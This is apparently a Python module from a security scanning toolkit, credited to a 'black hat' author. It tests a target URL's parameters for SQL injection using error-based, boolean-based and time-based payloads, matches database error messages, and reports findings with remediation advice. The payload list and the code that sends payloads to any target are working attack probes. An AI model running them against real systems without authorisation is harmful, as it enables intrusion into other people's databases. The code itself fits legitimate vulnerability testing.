# modules/vuln_scanner/sqli_scanner.py

"""
SQL Injection Scanner
Author: ATHEX BLACK HAT
Team: Wolf Intelligence PK
Version: 1.0.0

Detects SQL injection vulnerabilities using error-based,
boolean-based, and time-based detection techniques.
"""

import re
import time
from typing import Dict, List, Any, Optional
from urllib.parse import urlencode, urlparse, parse_qs

import requests
from requests.exceptions import RequestException


class SQLiScanner:
    """
    SQL Injection vulnerability scanner.
    
    Tests for SQL injection using multiple detection
    methods including error, boolean, and time-based.
    """
    
    SQLI_PAYLOADS = {
        'error_based': [
            "'",
            '"',
            "' OR '1'='1",
            "' OR '1'='1' --",
            "1' OR '1'='1' --",
            "admin' --",
            "' UNION SELECT NULL--",
        ],
        'boolean_based': [
            ("' AND 1=1--", "' AND 1=2--"),
            ("' AND 'a'='a' --", "' AND 'a'='b' --"),
        ],
        'time_based': [
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND pg_sleep(5)--",
        ],
    }
    
    SQL_ERROR_PATTERNS = [
        r'SQL syntax.*MySQL',
        r'Warning.*mysql_.*',
        r'MySQLSyntaxErrorException',
        r'valid MySQL result',
        r'PostgreSQL.*ERROR',
        r'Warning.*pg_.*',
        r'valid PostgreSQL result',
        r'ORA-\d+',
        r'SQLite.*error',
        r'SQLite3::',
        r'unclosed quotation mark',
        r'Microsoft OLE DB Provider for SQL Server',
        r'ODBC Driver.*SQL Server',
        r'Unclosed quotation mark after the character string',
        r'You have an error in your SQL syntax',
    ]
    
    def __init__(
        self,
        target: str,
        config: Optional[Dict[str, Any]] = None
    ):
        """
        Initialize the SQLi scanner.
        
        Args:
            target: Target URL
            config: Configuration dictionary
        """
        self.target = target.rstrip('/')
        self.config = config or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        
        self.timeout = self.config.get('timeout', 10)
        self.verify_ssl = self.config.get('verify_ssl', False)
        self.delay = self.config.get('delay', 0)
        
        self.vulnerabilities: List[Dict[str, Any]] = []
        self.errors: List[str] = []
    
    def extract_parameters(self, url: str) -> Dict[str, str]:
        """
        Extract URL parameters.
        
        Args:
            url: Target URL
            
        Returns:
            Dictionary of parameters
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        param_dict = {}
        for key, values in params.items():
            param_dict[key] = values[0] if values else ''
        
        return param_dict
    
    def send_payload(self, url: str, parameter: str, payload: str) -> Optional[requests.Response]:
        """
        Send SQL injection payload.
        
        Args:
            url: Target URL
            parameter: Parameter to inject
            payload: SQL payload
            
        Returns:
            HTTP response or None
        """
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = self.extract_parameters(url)
        params[parameter] = payload
        
        test_url = base_url + '?' + urlencode(params)
        
        try:
            response = self.session.get(
                test_url,
                timeout=self.timeout,
                verify=self.verify_ssl
            )
            
            if self.delay > 0:
                time.sleep(self.delay)
            
            return response
            
        except RequestException:
            return None
    
    def test_error_based(self, url: str, parameter: str) -> Optional[Dict[str, Any]]:
        """
        Test for error-based SQL injection.
        
        Args:
            url: Target URL
            parameter: Parameter name
            
        Returns:
            Dictionary with finding or None
        """
        for payload in self.SQLI_PAYLOADS['error_based']:
            response = self.send_payload(url, parameter, payload)
            
            if response:
                for pattern in self.SQL_ERROR_PATTERNS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        return {
                            'url': url,
                            'parameter': parameter,
                            'type': 'error_based',
                            'payload': payload,
                            'error_matched': pattern,
                        }
        
        return None
    
    def test_boolean_based(self, url: str, parameter: str) -> Optional[Dict[str, Any]]:
        """
        Test for boolean-based blind SQL injection.
        
        Args:
            url: Target URL
            parameter: Parameter name
            
        Returns:
            Dictionary with finding or None
        """
        for true_payload, false_payload in self.SQLI_PAYLOADS['boolean_based']:
            true_response = self.send_payload(url, parameter, true_payload)
            
            if self.delay > 0:
                time.sleep(self.delay)
            
            false_response = self.send_payload(url, parameter, false_payload)
            
            if true_response and false_response:
                if len(true_response.content) != len(false_response.content):
                    return {
                        'url': url,
                        'parameter': parameter,
                        'type': 'boolean_based',
                        'payload': true_payload,
                        'true_length': len(true_response.content),
                        'false_length': len(false_response.content),
                    }
        
        return None
    
    def test_time_based(self, url: str, parameter: str) -> Optional[Dict[str, Any]]:
        """
        Test for time-based blind SQL injection.
        
        Args:
            url: Target URL
            parameter: Parameter name
            
        Returns:
            Dictionary with finding or None
        """
        for payload in self.SQLI_PAYLOADS['time_based']:
            start_time = time.time()
            response = self.send_payload(url, parameter, payload)
            elapsed = time.time() - start_time
            
            if response and elapsed >= 4.5:
                return {
                    'url': url,
                    'parameter': parameter,
                    'type': 'time_based',
                    'payload': payload,
                    'response_time': f'{elapsed:.2f}s',
                }
        
        return None
    
    def run(self) -> Dict[str, Any]:
        """
        Run SQL injection scan.
        
        Returns:
            Dictionary with scan results
        """
        params = self.extract_parameters(self.target)
        
        for param_name in params:
            error_result = self.test_error_based(self.target, param_name)
            
            if error_result:
                self.vulnerabilities.append(error_result)
                continue
            
            boolean_result = self.test_boolean_based(self.target, param_name)
            
            if boolean_result:
                self.vulnerabilities.append(boolean_result)
                continue
            
            time_result = self.test_time_based(self.target, param_name)
            
            if time_result:
                self.vulnerabilities.append(time_result)
        
        findings = []
        
        for vuln in self.vulnerabilities:
            severity = 'critical' if vuln['type'] in ['error_based', 'union_based'] else 'high'
            
            findings.append({
                'type': f'SQL Injection ({vuln["type"]})',
                'severity': severity,
                'endpoint': vuln['url'],
                'parameter': vuln['parameter'],
                'description': f"SQL injection detected via {vuln['type']} in parameter '{vuln['parameter']}'",
                'evidence': vuln,
                'remediation': 'Use parameterized queries, prepared statements, and input validation',
            })
        
        return {
            'findings': findings,
            'errors': self.errors,
            'vulnerabilities_found': len(findings),
        }